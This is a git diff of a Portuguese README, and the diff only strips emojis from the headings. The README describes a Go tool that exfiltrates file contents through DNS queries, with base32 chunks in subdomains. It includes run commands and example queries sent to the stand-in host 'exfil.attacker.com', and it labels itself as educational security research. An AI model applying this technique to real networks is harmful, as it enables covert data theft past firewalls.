@@ -4,13 +4,13 @@
 Ferramenta escrita em Go para **exfiltração de dados via requisições DNS**, utilizando codificação base32 e fragmentação em subdomínios.
 
 
-## 📌 Visão Geral
+##  Visão Geral
 
 Este projeto simula uma técnica avançada usada por agentes maliciosos para **vazar dados através de requisições DNS**, contornando firewalls e bloqueios de HTTP/HTTPS. O cliente lê um arquivo, fragmenta, codifica e envia cada pedaço como subdomínio. O servidor intercepta as queries DNS, reagrupa os pedaços e reconstrói o conteúdo original.
 
 ---
 
-## ⚙️ Estrutura do Projeto
+##  Estrutura do Projeto
 
 ```
 
@@ -25,7 +25,7 @@ dns-exfil-go/
 
 ---
 
-## 🔁 Como Funciona
+##  Como Funciona
 
 1. O cliente lê um arquivo local (`data.txt`) e divide o conteúdo em pedaços.
 2. Cada pedaço é codificado em Base32.
@@ -39,16 +39,16 @@ dns-exfil-go/
 
 ---
 
-## 🚀 Como Usar
+##  Como Usar
 
-### ⚙️ Requisitos
+###  Requisitos
 
 - Go 1.16 ou superior
 - Biblioteca: `github.com/miekg/dns` (instalada com `go mod tidy`)
 
 ---
 
-### 🛰️ Rodar o Servidor
+###  Rodar o Servidor
 
 ```bash
 cd dns-exfil-go
@@ -60,7 +60,7 @@ go run server.go
 
 ---
 
-### 🧪 Rodar o Cliente
+###  Rodar o Cliente
 
 ```bash
 go run client.go
@@ -71,7 +71,7 @@ go run client.go
 
 ---
 
-## 🔐 Exemplo de Requisição DNS Enviada
+##  Exemplo de Requisição DNS Enviada
 
 ```
 U3RyaW5nMQ.session42.0.exfil.attacker.com
@@ -81,7 +81,7 @@ RU5EX09GX1NFU1NJT04.session42.2.exfil.attacker.com
 
 ---
 
-## 🧯 Aviso Ético
+##  Aviso Ético
 
 > Esta ferramenta foi criada **exclusivamente para fins educacionais e de pesquisa em segurança**.
 > Qualquer uso não autorizado, especialmente em sistemas que você não possui ou não tem permissão explícita para testar, é ilegal.
@@ -89,7 +89,7 @@ RU5EX09GX1NFU1NJT04.session42.2.exfil.attacker.com
 
 ---
 
-## 🧠 Referências Técnicas
+##  Referências Técnicas
 
 * [Red Teaming with DNS Exfiltration](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/data-exfiltration-over-dns)
 * [miekg/dns - Go DNS lib](https://github.com/miekg/dns)
